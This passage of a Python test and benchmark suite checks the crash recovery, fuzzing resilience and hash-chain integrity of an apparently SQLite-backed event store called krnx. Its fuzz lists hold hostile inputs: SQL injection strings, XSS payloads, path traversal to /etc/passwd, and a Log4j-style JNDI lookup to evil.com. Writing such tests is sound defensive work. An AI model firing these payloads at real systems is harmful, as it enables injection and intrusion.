                INSERT INTO events (event_id, event_type, agent, content, ts, branch, parent_hash, hash)
                VALUES ('evt_incomplete', 'crash', 'test', '{}', 0, 'main', NULL, 'abc')
            """)
            # Don't commit - just close (simulating crash)
            conn.close()
            
            # Try to recover
            s2 = krnx.init("batch_crash", path=temp_dir)
            
            # Uncommitted transaction should be rolled back
            events = s2.log(limit=1000)
            incomplete_exists = any(e.id == "evt_incomplete" for e in events)
            
            # Should still verify (chain intact)
            try:
                s2.verify()
                verify_ok = True
            except:
                verify_ok = False
            
            passed = not incomplete_exists and verify_ok and len(events) == initial_count
            self._record("crash_recovery_mid_batch", passed,
                        f"rolled back incomplete, {len(events)} events intact")
        except Exception as e:
            self._record("crash_recovery_mid_batch", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_recovery_after_wal_checkpoint(self):
        """Test recovery after WAL checkpoint."""
        temp_dir = tempfile.mkdtemp(prefix="krnx_wal_")
        
        try:
            s = krnx.init("wal_test", path=temp_dir)
            
            # Write enough to trigger WAL growth
            for i in range(1000):
                s.record("wal_test", {"index": i, "data": "x" * 100})
            
            # Force WAL checkpoint
            conn = s._get_conn()
            conn.execute("PRAGMA wal_checkpoint(TRUNCATE)")
            
            # Write more after checkpoint
            for i in range(100):
                s.record("post_checkpoint", {"index": i})
            
            pre_close_count = s.count()
            s.close()
            
            # Reopen and verify
            s2 = krnx.init("wal_test", path=temp_dir)
            post_open_count = s2.count()
            
            try:
                s2.verify()
                verify_ok = True
            except:
                verify_ok = False
            
            passed = pre_close_count == post_open_count and verify_ok
            self._record("recovery_after_wal_checkpoint", passed,
                        f"{post_open_count} events preserved")
        except Exception as e:
            self._record("recovery_after_wal_checkpoint", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    # =========================================================================
    # SOAK TESTING
    # =========================================================================
    
    def test_soak_sustained_writes(self):
        """Sustained write load over time, check for degradation."""
        temp_dir = tempfile.mkdtemp(prefix="krnx_soak_")
        
        try:
            s = krnx.init("soak_test", path=temp_dir)
            
            duration_sec = self.config.soak_duration_sec
            samples = []
            total_events = 0
            
            start_time = time.time()
            sample_interval = 10.0  # Sample every 10 seconds
            next_sample = start_time + sample_interval
            interval_events = 0
            last_sample_time = start_time
            
            print(f"    Running {duration_sec}s soak test...")
            
            while time.time() - start_time < duration_sec:
                # Write batch
                for _ in range(100):
                    s.record("soak", {"ts": time.time(), "data": "x" * 50})
                    total_events += 1
                    interval_events += 1
                
                # Sample throughput
                now = time.time()
                if now >= next_sample:
                    elapsed = now - last_sample_time
                    throughput = interval_events / elapsed if elapsed > 0 else 0
                    samples.append(throughput)
                    
                    # Progress indicator
                    elapsed_total = now - start_time
                    pct = (elapsed_total / duration_sec) * 100
                    print(f"      {pct:5.1f}% | {total_events:,} events | {throughput:,.0f}/sec")
                    
                    interval_events = 0
                    last_sample_time = now
                    next_sample = now + sample_interval
            
            # Verify integrity after soak
            print("    Verifying integrity...")
            try:
                s.verify()
                verify_ok = True
            except:
                verify_ok = False
            
            # Check for significant degradation (last 3 samples avg < 50% of first 3)
            if len(samples) >= 6:
                first_avg = statistics.mean(samples[:3])
                last_avg = statistics.mean(samples[-3:])
                degradation = last_avg / first_avg if first_avg > 0 else 1
                no_major_degradation = degradation > 0.5
            elif len(samples) >= 2:
                degradation = samples[-1] / samples[0] if samples[0] > 0 else 1
                no_major_degradation = degradation > 0.5
            else:
                no_major_degradation = True
                degradation = 1.0
            
            avg_throughput = statistics.mean(samples) if samples else 0
            min_throughput = min(samples) if samples else 0
            max_throughput = max(samples) if samples else 0
            
            passed = verify_ok and no_major_degradation and total_events > 0
            self._record("soak_sustained_writes", passed,
                        f"{total_events:,} events in {duration_sec}s, "
                        f"avg {avg_throughput:,.0f}/sec (min {min_throughput:,.0f}, max {max_throughput:,.0f}), "
                        f"degradation ratio {degradation:.2f}")
        except Exception as e:
            self._record("soak_sustained_writes", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_soak_memory_stability(self):
        """Check for memory leaks during sustained operation."""
        temp_dir = tempfile.mkdtemp(prefix="krnx_mem_")
        
        try:
            import tracemalloc
            tracemalloc.start()
            
            s = krnx.init("memory_test", path=temp_dir)
            
            # Get baseline
            baseline = tracemalloc.get_traced_memory()[0]
            
            # Do a lot of operations
            for cycle in range(10):
                # Write
                for i in range(500):
                    s.record("memory", {"cycle": cycle, "index": i})
                
                # Read
                events = s.log(limit=100)
                
                # Search
                s.search("cycle")
                
                # Branch operations
                if cycle % 3 == 0:
                    try:
                        s.branch(f"mem_branch_{cycle}")
                    except:
                        pass
            
            # Get final memory
            final = tracemalloc.get_traced_memory()[0]
            tracemalloc.stop()
            
            # Allow up to 50MB growth (generous for Python)
            memory_growth = (final - baseline) / (1024 * 1024)
            acceptable_growth = memory_growth < 50
            
            passed = acceptable_growth
            self._record("soak_memory_stability", passed,
                        f"memory growth: {memory_growth:.1f}MB")
        except Exception as e:
            self._record("soak_memory_stability", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    # =========================================================================
    # FUZZING
    # =========================================================================
    
    def test_fuzz_event_types(self):
        """Fuzz event type field with random/malicious inputs."""
        s, temp_dir = create_temp_substrate()
        
        try:
            import random
            import string
            
            fuzz_types = [
                "",  # Empty
                " ",  # Whitespace
                "a" * 10000,  # Very long
                "\x00\x01\x02",  # Binary
                "'; DROP TABLE events; --",  # SQL injection
                "<script>alert(1)</script>",  # XSS
                "type\nwith\nnewlines",
                "type\twith\ttabs",
                "日本語タイプ",  # Unicode
                "type with spaces",
                "../../../etc/passwd",  # Path traversal
                "${jndi:ldap://evil.com}",  # Log4j style
                "{{template}}",  # Template injection
                None,  # Will be caught by type hints
            ]
            
            successes = 0
            failures = 0
            
            for i, fuzz_type in enumerate(fuzz_types):
                try:
                    if fuzz_type is None:
                        continue
                    s.record(fuzz_type, {"fuzz_index": i})
                    successes += 1
                except Exception:
                    failures += 1
            
            # Verify DB still intact
            try:
                s.verify()
                verify_ok = True
            except:
                verify_ok = False
            
            # Should have handled all inputs without crashing
            passed = verify_ok and (successes + failures == len(fuzz_types) - 1)
            self._record("fuzz_event_types", passed,
                        f"{successes} accepted, {failures} rejected, db intact")
        except Exception as e:
            self._record("fuzz_event_types", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_fuzz_content_structure(self):
        """Fuzz content with random structures."""
        s, temp_dir = create_temp_substrate()
        
        try:
            import random
            
            def random_value(depth=0):
                if depth > 5:
                    return "max_depth"
                choice = random.randint(0, 6)
                if choice == 0:
                    return None
                elif choice == 1:
                    return random.randint(-10**9, 10**9)
                elif choice == 2:
                    return random.random() * 10**6
                elif choice == 3:
                    return "".join(random.choices("abcdef\x00\n\t🔥", k=random.randint(0, 100)))
                elif choice == 4:
                    return [random_value(depth+1) for _ in range(random.randint(0, 5))]
                elif choice == 5:
                    return {f"key_{i}": random_value(depth+1) for i in range(random.randint(0, 5))}
                else:
                    return random.choice([True, False])
            
            successes = 0
            
            for i in range(100):
                try:
                    content = {f"field_{j}": random_value() for j in range(random.randint(1, 10))}
                    s.record("fuzz", content)
                    successes += 1
                except Exception:
                    pass
            
            # Verify
            try:
                s.verify()
                verify_ok = True
            except:
                verify_ok = False
            
            passed = verify_ok and successes > 50  # At least half should succeed
            self._record("fuzz_content_structure", passed,
                        f"{successes}/100 random structures handled")
        except Exception as e:
            self._record("fuzz_content_structure", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_fuzz_agent_names(self):
        """Fuzz agent names with random inputs."""
        s, temp_dir = create_temp_substrate()
        
        try:
            fuzz_agents = [
                "",
                " " * 100,
                "agent\x00with\x00nulls",
                "'; DELETE FROM events; --",
                "a" * 10000,
                "agent/with/slashes",
                "../../etc/passwd",
                "エージェント",
                "<img src=x onerror=alert(1)>",
                "agent\nwith\nnewline",
            ]
            
            successes = 0
            for i, agent in enumerate(fuzz_agents):
                try:
                    s.record("test", {"index": i}, agent=agent)
                    successes += 1
                except:
                    pass
            
            try:
                s.verify()
                verify_ok = True
            except:
                verify_ok = False
            
            passed = verify_ok
            self._record("fuzz_agent_names", passed,
                        f"{successes}/{len(fuzz_agents)} agents handled")
        except Exception as e:
            self._record("fuzz_agent_names", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_fuzz_branch_operations(self):
        """Fuzz branch operations with rapid create/delete/switch."""
        s, temp_dir = create_temp_substrate()
        
        try:
            import random
            
            base_id = s.record("base", {})
            branches_created = ["main"]
            
            for i in range(100):
                op = random.choice(["create", "delete", "write", "read"])
                
                try:
                    if op == "create":
                        name = f"branch_{random.randint(0, 50)}"
                        if name not in branches_created:
                            s.branch(name, from_event=base_id)
                            branches_created.append(name)
                    
                    elif op == "delete":
                        if len(branches_created) > 1:
                            name = random.choice([b for b in branches_created if b != "main"])
                            s.branch_delete(name)
                            branches_created.remove(name)
                    
                    elif op == "write":
                        branch = random.choice(branches_created)
                        s.record("fuzz", {"op": i}, branch=branch)
                    
                    elif op == "read":
                        branch = random.choice(branches_created)
                        s.log(limit=10, branch=branch)
                
                except Exception:
                    pass
            
            # Verify all remaining branches
            all_valid = True
            for branch in branches_created:
                try:
                    s.verify(branch)
                except:
                    all_valid = False
                    break
            
            passed = all_valid
            self._record("fuzz_branch_operations", passed,
                        f"{len(branches_created)} branches intact")
        except Exception as e:
            self._record("fuzz_branch_operations", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_fuzz_timestamps(self):
        """Fuzz timestamp field with edge cases."""
        s, temp_dir = create_temp_substrate()
        
        try:
            fuzz_timestamps = [
                0,  # Epoch
                -1,  # Negative
                time.time(),  # Normal
                time.time() + 86400 * 365 * 100,  # Far future
                0.000001,  # Tiny
                10**15,  # Very large
            ]
            
            # These should fail gracefully
            invalid_timestamps = [
                float('inf'),  # Infinity
                -float('inf'),  # Negative infinity
                float('nan'),  # NaN
            ]
            
            successes = 0
            for i, ts in enumerate(fuzz_timestamps):
                try:
                    s.record("ts_fuzz", {"index": i}, ts=ts)
                    successes += 1
                except:
                    pass
            
            # Invalid timestamps should either fail or be handled
            invalid_handled = 0
            for ts in invalid_timestamps:
                try:
                    s.record("ts_invalid", {"ts": str(ts)}, ts=ts)
                    invalid_handled += 1
                except:
                    invalid_handled += 1  # Rejection is fine
            
            try:
                s.verify()
                verify_ok = True
            except:
                verify_ok = False
            
            passed = verify_ok and successes >= 5
            self._record("fuzz_timestamps", passed,
                        f"{successes}/{len(fuzz_timestamps)} valid timestamps, db intact")
        except Exception as e:
            self._record("fuzz_timestamps", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_fuzz_rapid_branch_switching(self):
        """Rapidly switch between branches while writing."""
        s, temp_dir = create_temp_substrate()
        
        try:
            # Create several branches
            base_id = s.record("base", {})
            branches = ["main"]
            for i in range(5):
                s.branch(f"rapid_{i}", from_event=base_id)
                branches.append(f"rapid_{i}")
            
            # Rapidly write to different branches
            import random
            for i in range(500):
                branch = random.choice(branches)
                s.record("rapid", {"index": i, "branch": branch}, branch=branch)
            
            # Verify all branches
            all_valid = True
            total_events = 0
            for branch in branches:
                try:
                    s.verify(branch)
                    total_events += s.count(branch)
                except:
                    all_valid = False
            
            passed = all_valid and total_events >= 500
            self._record("fuzz_rapid_branch_switching", passed,
                        f"{total_events} events across {len(branches)} branches")
        except Exception as e:
            self._record("fuzz_rapid_branch_switching", False, str(e))
        finally:
            cleanup_temp(temp_dir)


class CorrectnessTests:
    """Correctness test suite."""
    
    def __init__(self, config: BenchConfig):
        self.config = config
        self.results: List[Dict] = []
    
    def run_all(self) -> List[Dict]:
        """Run all correctness tests."""
        print("\n=== CORRECTNESS TESTS ===\n")
        
        self.test_hash_chain_integrity()
        self.test_branch_isolation()
        self.test_concurrent_ordering()
        self.test_export_import_fidelity()
        self.test_timestamp_ordering()
        self.test_verify_detects_corruption()
        
        return self.results
    
    def _record(self, name: str, passed: bool, details: str = ""):
        """Record test result."""
        status = "PASS" if passed else "FAIL"
        self.results.append({
            "name": name,
            "passed": passed,
            "status": status,
            "details": details
        })
        print(f"  {name}: {status}" + (f" ({details})" if details else ""))
    
    def test_hash_chain_integrity(self):
        """Test that hash chain is valid after many writes."""
        s, temp_dir = create_temp_substrate()
        
        try:
            # Write many events
            for i in range(self.config.correctness_event_count):
                s.record("test", generate_content(i))
            
            # Verify chain
            s.verify()
            
            # Manual check: each event's parent should match previous hash
            events = s.log(limit=self.config.correctness_event_count)
            events.reverse()  # Oldest first
            
            valid = True
            for i in range(1, len(events)):
                if events[i].parent != events[i-1].hash:
                    valid = False
                    break
            
            self._record("hash_chain_integrity", valid, 
                        f"{len(events)} events verified")
        except Exception as e:
            self._record("hash_chain_integrity", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_branch_isolation(self):
        """Test that branches are isolated."""
        s, temp_dir = create_temp_substrate()
        
        try:
            # Create events on main
            eid = s.record("main_event", {"branch": "main"})
            s.record("main_event_2", {"branch": "main"})
            
            # Create branch
            s.branch("isolated", from_event=eid)
            
            # Add events to branch
            s.record("branch_event", {"branch": "isolated"}, branch="isolated")
            s.record("branch_event_2", {"branch": "isolated"}, branch="isolated")
            
            # Check isolation
            main_events = s.log(branch="main")
            isolated_events = s.log(branch="isolated")
            
            main_has_branch = any("isolated" in str(e.content) for e in main_events)
            isolated_has_main_only = any("main_event_2" in str(e.content) for e in isolated_events)
            
            passed = not main_has_branch and not isolated_has_main_only
            self._record("branch_isolation", passed,
                        f"main: {len(main_events)}, isolated: {len(isolated_events)}")
        except Exception as e:
            self._record("branch_isolation", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_concurrent_ordering(self):
        """Test that concurrent writes maintain valid hash chain."""
        s, temp_dir = create_temp_substrate()
        
        try:
            num_threads = 8
            events_per_thread = 50
            
            def writer(thread_id: int):
                for i in range(events_per_thread):
                    s.record("concurrent", {"thread": thread_id, "index": i})
            
            with ThreadPoolExecutor(max_workers=num_threads) as executor:
                futures = [executor.submit(writer, t) for t in range(num_threads)]
                for f in as_completed(futures):
                    f.result()
            
            # Verify chain is still valid
            s.verify()
            
            # Check we got all events
            count = s.count()
            expected = num_threads * events_per_thread
            
            self._record("concurrent_ordering", count == expected,
                        f"{count}/{expected} events, chain valid")
        except Exception as e:
            self._record("concurrent_ordering", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_export_import_fidelity(self):
        """Test that export/import preserves all data."""
        s, temp_dir = create_temp_substrate()
        
        try:
            # Create varied events
            for i in range(100):
                s.record(
                    f"type_{i % 5}",
                    {"index": i, "data": f"value_{i}", "nested": {"a": i}},
                    agent=f"agent_{i % 3}"
                )
            
            original_events = s.log(limit=1000)
            original_events.reverse()
            
            # Export
            export_path = Path(temp_dir) / "export.jsonl"
            s.export(path=str(export_path))
            
            # Create new substrate and import
            s2, temp_dir2 = create_temp_substrate("imported")
            s2.import_events(str(export_path))
            
            imported_events = s2.log(limit=1000)
            imported_events.reverse()
            
            # Compare
            if len(original_events) != len(imported_events):
                self._record("export_import_fidelity", False,
                            f"count mismatch: {len(original_events)} vs {len(imported_events)}")
            else:
                matches = all(
                    o.type == i.type and o.content == i.content and o.agent == i.agent
                    for o, i in zip(original_events, imported_events)
                )
                self._record("export_import_fidelity", matches,
                            f"{len(original_events)} events")
            
            cleanup_temp(temp_dir2)
        except Exception as e:
            self._record("export_import_fidelity", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_timestamp_ordering(self):
        """Test that events with manual timestamps are handled correctly."""
        s, temp_dir = create_temp_substrate()
        
        try:
            # Write events with out-of-order timestamps
            base_ts = time.time()
            s.record("event", {"order": 1}, ts=base_ts + 100)
            s.record("event", {"order": 2}, ts=base_ts + 50)
            s.record("event", {"order": 3}, ts=base_ts + 200)
            s.record("event", {"order": 4}, ts=base_ts)
            
            # Verify chain still valid
            s.verify()
            
            # Check at() returns correct events
            state_at_150 = s.at(base_ts + 150)
            orders = [e.content["order"] for e in state_at_150]
            
            # Should have events with ts <= base_ts + 150
            # That's order 1 (ts+100), 2 (ts+50), 4 (ts)
            expected = {1, 2, 4}
            actual = set(orders)
            
            self._record("timestamp_ordering", actual == expected,
                        f"at(ts+150): expected {expected}, got {actual}")
        except Exception as e:
            self._record("timestamp_ordering", False, str(e))
        finally:
            cleanup_temp(temp_dir)
    
    def test_verify_detects_corruption(self):
        """Test that verify() catches tampered data."""
        s, temp_dir = create_temp_substrate()
        
        try:
            # Create valid chain
            for i in range(10):
                s.record("test", {"index": i})
            
            # Verify passes
            s.verify()
            
            # Tamper with database directly
            import sqlite3
            conn = sqlite3.connect(str(Path(temp_dir) / "bench.db"))
            conn.execute("UPDATE events SET content = '{\"tampered\": true}' WHERE id = 5")
            conn.commit()
            conn.close()
            
            # Verify should now fail
            detected = False
            try:
                # Need fresh connection to see changes
                s2 = krnx.init("bench", path=temp_dir)
                s2.verify()
            except IntegrityError:
                detected = True
            
            self._record("verify_detects_corruption", detected,
                        "tampered row 5")
        except Exception as e:
            self._record("verify_detects_corruption", False, str(e))
        finally:
            cleanup_temp(temp_dir)


# =============================================================================
# REPORT GENERATION
# =============================================================================

def generate_summary(perf_results: List[BenchResult], correct_results: List[Dict], 
                    security_results: List[Dict] = None, hardening_results: List[Dict] = None) -> Dict:
    """Generate summary statistics."""
    security_results = security_results or []
    hardening_results = hardening_results or []
    
    # Find key metrics
    write_throughputs = [r.value for r in perf_results 
                        if r.name == "write_throughput"]
    
    read_p50 = next((r.value for r in perf_results 
                     if r.name == "read_latency_log" and r.metric == "p50_ms"), 0)
    read_p99 = next((r.value for r in perf_results 
                     if r.name == "read_latency_log" and r.metric == "p99_ms"), 0)
    
    bytes_per_event = next((r.value for r in perf_results 
                           if r.name == "disk_usage"), 0)
    
    correctness_passed = sum(1 for r in correct_results if r["passed"])
    correctness_total = len(correct_results)
    
    security_passed = sum(1 for r in security_results if r["passed"])
    security_total = len(security_results)
    
    hardening_passed = sum(1 for r in hardening_results if r["passed"])
    hardening_total = len(hardening_results)
    
    return {
        "peak_write_throughput": max(write_throughputs) if write_throughputs else 0,
        "read_latency_p50_ms": read_p50,
        "read_latency_p99_ms": read_p99,
        "bytes_per_event": bytes_per_event,
        "correctness_passed": correctness_passed,
        "correctness_total": correctness_total,
        "correctness_rate": f"{correctness_passed}/{correctness_total}",
        "security_passed": security_passed,
        "security_total": security_total,
        "security_rate": f"{security_passed}/{security_total}",
        "hardening_passed": hardening_passed,
        "hardening_total": hardening_total,
        "hardening_rate": f"{hardening_passed}/{hardening_total}",
    }


def generate_markdown(report: BenchReport) -> str:
    """Generate markdown summary."""
    lines = [
        "# krnx Benchmark Results",
        "",
        f"**Date:** {report.timestamp}",
        f"**Python:** {report.system_info['python_version']}",
        f"**Platform:** {report.system_info['platform']}",
        f"**CPUs:** {report.system_info['cpu_count']}",
        "",
        "## Summary",
        "",
        f"| Metric | Value |",
        f"|--------|-------|",
        f"| Peak Write Throughput | {report.summary['peak_write_throughput']:,.0f} events/sec |",
        f"| Read Latency (p50) | {report.summary['read_latency_p50_ms']:.3f} ms |",
        f"| Read Latency (p99) | {report.summary['read_latency_p99_ms']:.3f} ms |",
        f"| Disk Usage | {report.summary['bytes_per_event']:.1f} bytes/event |",
        f"| Correctness Tests | {report.summary['correctness_rate']} passed |",
        f"| Security Tests | {report.summary['security_rate']} passed |",
        f"| Hardening Tests | {report.summary['hardening_rate']} passed |",
        "",
        "## Performance Details",
        "",
    ]
    
    # Write throughput
    lines.append("### Write Throughput")
    lines.append("")
    lines.append("| Events | Throughput | Time |")
    lines.append("|--------|------------|------|")
    for r in report.performance:
        if r["name"] == "write_throughput":
            lines.append(f"| {r['params']['event_count']:,} | {r['value']:,.2f} events/sec | {r['params']['elapsed_sec']:.3f}s |")
    lines.append("")
    
    # Read latency
    lines.append("### Read Latency")
    lines.append("")
    lines.append("| Operation | p50 | p95 | p99 |")
    lines.append("|-----------|-----|-----|-----|")
    
    for op in ["log", "show", "at"]:
        p50 = next((r["value"] for r in report.performance 
                   if r["name"] == f"read_latency_{op}" and r["metric"] == "p50_ms"), "-")
        p95 = next((r["value"] for r in report.performance 
                   if r["name"] == f"read_latency_{op}" and r["metric"] == "p95_ms"), "-")
        p99 = next((r["value"] for r in report.performance 
                   if r["name"] == f"read_latency_{op}" and r["metric"] == "p99_ms"), "-")
        lines.append(f"| {op}() | {p50} ms | {p95} ms | {p99} ms |")
    lines.append("")
    
    # Concurrent writes
    lines.append("### Concurrent Writes")
    lines.append("")
    lines.append("| Threads | Throughput | Integrity |")
    lines.append("|---------|------------|-----------|")
    for r in report.performance:
        if r["name"] == "concurrent_writes":
            lines.append(f"| {r['params']['threads']} | {r['value']:,.2f} events/sec | {r['params']['integrity']} |")
    lines.append("")
    
    # Correctness
    lines.append("## Correctness Tests")
    lines.append("")
    lines.append("| Test | Status | Details |")
    lines.append("|------|--------|---------|")
    for r in report.correctness:
        status = "✓ PASS" if r["passed"] else "✗ FAIL"
        lines.append(f"| {r['name']} | {status} | {r['details']} |")
    lines.append("")
    
    # Security
    lines.append("## Security Tests")
    lines.append("")
    lines.append("### Data Leakage")
    lines.append("")
    lines.append("| Test | Status | Details |")
    lines.append("|------|--------|---------|")
    leakage_tests = ["workspace_isolation", "branch_data_isolation", 
                    "deleted_branch_not_queryable", "search_branch_isolation"]
    for r in report.security:
        if r["name"] in leakage_tests:
            status = "✓ PASS" if r["passed"] else "✗ FAIL"
            lines.append(f"| {r['name']} | {status} | {r['details']} |")
    lines.append("")
    
    lines.append("### Injection Attacks")
    lines.append("")
    lines.append("| Test | Status | Details |")
    lines.append("|------|--------|---------|")
    injection_tests = ["sql_injection_content", "sql_injection_search",
                      "sql_injection_branch_name", "path_traversal_workspace"]
    for r in report.security:
        if r["name"] in injection_tests:
            status = "✓ PASS" if r["passed"] else "✗ FAIL"
            lines.append(f"| {r['name']} | {status} | {r['details']} |")
    lines.append("")
    
    lines.append("### Content Handling")
    lines.append("")
    lines.append("| Test | Status | Details |")
    lines.append("|------|--------|---------|")
    content_tests = ["malformed_json_resilience", "unicode_content",
                    "binary_content", "large_content"]
    for r in report.security:
        if r["name"] in content_tests:
            status = "✓ PASS" if r["passed"] else "✗ FAIL"
            lines.append(f"| {r['name']} | {status} | {r['details']} |")
    lines.append("")
    
    lines.append("### Integrity Attacks")
    lines.append("")
    lines.append("| Test | Status | Details |")
    lines.append("|------|--------|---------|")
    integrity_tests = ["hash_cannot_be_forged", "parent_chain_tampering",
                      "replay_attack_detection"]
    for r in report.security:
        if r["name"] in integrity_tests:
            status = "✓ PASS" if r["passed"] else "✗ FAIL"
            lines.append(f"| {r['name']} | {status} | {r['details']} |")
    lines.append("")
    
    lines.append("### Resource Exhaustion")
    lines.append("")
    lines.append("| Test | Status | Details |")
    lines.append("|------|--------|---------|")
    resource_tests = ["large_event_count", "many_branches", "deep_content_nesting"]
    for r in report.security:
        if r["name"] in resource_tests:
            status = "✓ PASS" if r["passed"] else "✗ FAIL"
            lines.append(f"| {r['name']} | {status} | {r['details']} |")
    lines.append("")
    
    # Hardening
    lines.append("## Hardening Tests")
    lines.append("")
    
    lines.append("### Crash Recovery")
    lines.append("")
    lines.append("| Test | Status | Details |")
    lines.append("|------|--------|---------|")
    crash_tests = ["crash_recovery_mid_write", "crash_recovery_mid_batch", "recovery_after_wal_checkpoint"]
    for r in report.hardening:
        if r["name"] in crash_tests:
            status = "✓ PASS" if r["passed"] else "✗ FAIL"
            lines.append(f"| {r['name']} | {status} | {r['details']} |")
    lines.append("")
    
    lines.append("### Soak Testing")
    lines.append("")
    lines.append("| Test | Status | Details |")
    lines.append("|------|--------|---------|")
    soak_tests = ["soak_sustained_writes", "soak_memory_stability"]
    for r in report.hardening:
        if r["name"] in soak_tests:
            status = "✓ PASS" if r["passed"] else "✗ FAIL"
            lines.append(f"| {r['name']} | {status} | {r['details']} |")
    lines.append("")
    
    lines.append("### Fuzzing")
    lines.append("")
    lines.append("| Test | Status | Details |")
    lines.append("|------|--------|---------|")
    fuzz_tests = ["fuzz_event_types", "fuzz_content_structure", "fuzz_agent_names",
                  "fuzz_branch_operations", "fuzz_timestamps", "fuzz_rapid_branch_switching"]
    for r in report.hardening:
        if r["name"] in fuzz_tests:
            status = "✓ PASS" if r["passed"] else "✗ FAIL"
            lines.append(f"| {r['name']} | {status} | {r['details']} |")
    lines.append("")
    
    return "\n".join(lines)


# =============================================================================
# MAIN
# =============================================================================

def run_benchmarks(
    perf: bool = True,
    correctness: bool = True,
    security: bool = True,
    hardening: bool = True,
    output_dir: str = "results",
    config: BenchConfig = None
) -> BenchReport:
    """Run benchmarks and generate report."""
    
    print("=" * 60)
    print("krnx Benchmark Suite")
    print("=" * 60)
    
    config = config or BenchConfig()
    system_info = get_system_info()
    
    print(f"\nSystem: {system_info['platform']}")
    print(f"Python: {system_info['python_version']}")
    print(f"CPUs: {system_info['cpu_count']}")
    
    perf_results = []
    correct_results = []
    security_results = []
    hardening_results = []
    
    if perf:
        perf_bench = PerformanceBenchmarks(config)
        perf_results = perf_bench.run_all()
    
    if correctness:
        correct_tests = CorrectnessTests(config)
        correct_results = correct_tests.run_all()
    
    if security:
        security_tests = SecurityTests(config)
        security_results = security_tests.run_all()
    
    if hardening:
        hardening_tests = HardeningTests(config)
        hardening_results = hardening_tests.run_all()
    
    summary = generate_summary(perf_results, correct_results, security_results, hardening_results)
    
    report = BenchReport(
        timestamp=datetime.now().isoformat(),
        system_info=system_info,
        config=asdict(config),
        performance=[asdict(r) for r in perf_results],
        correctness=correct_results,
        security=security_results,
        hardening=hardening_results,
        summary=summary,
    )
    
    # Output
    output_path = Path(output_dir)
    output_path.mkdir(parents=True, exist_ok=True)
    
    # JSON
    json_path = output_path / "benchmark_results.json"
    with open(json_path, "w") as f:
        json.dump(asdict(report), f, indent=2)
    print(f"\n✓ JSON results: {json_path}")
    
    # Markdown
    md_path = output_path / "benchmark_summary.md"
    md_content = generate_markdown(report)
    with open(md_path, "w") as f:
        f.write(md_content)
    print(f"✓ Markdown summary: {md_path}")
    
    # Print summary
    print("\n" + "=" * 60)
    print("SUMMARY")
    print("=" * 60)
    print(f"Peak write throughput: {summary['peak_write_throughput']:,.0f} events/sec")
    print(f"Read latency (p50):    {summary['read_latency_p50_ms']:.3f} ms")
    print(f"Read latency (p99):    {summary['read_latency_p99_ms']:.3f} ms")
    print(f"Disk usage:            {summary['bytes_per_event']:.1f} bytes/event")
    print(f"Correctness:           {summary['correctness_rate']} tests passed")
    print(f"Security:              {summary['security_rate']} tests passed")
    print(f"Hardening:             {summary['hardening_rate']} tests passed")
    print("=" * 60)
    
    return report


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="krnx Benchmark Suite")
    parser.add_argument("--perf", action="store_true", help="Run performance benchmarks only")
    parser.add_argument("--correctness", action="store_true", help="Run correctness tests only")
    parser.add_argument("--security", action="store_true", help="Run security tests only")
    parser.add_argument("--hardening", action="store_true", help="Run hardening tests only")
    parser.add_argument("--soak-duration", type=int, default=600, help="Soak test duration in seconds (default: 600)")
    parser.add_argument("--output", default="results", help="Output directory")
    
    args = parser.parse_args()
    
    # Create config with soak duration
    config = BenchConfig(soak_duration_sec=args.soak_duration)
    
    # If none specified, run all
    if not args.perf and not args.correctness and not args.security and not args.hardening:
        run_benchmarks(perf=True, correctness=True, security=True, hardening=True, 
                      output_dir=args.output, config=config)
    else:
        run_benchmarks(perf=args.perf, correctness=args.correctness, 
                      security=args.security, hardening=args.hardening, 
                      output_dir=args.output, config=config)
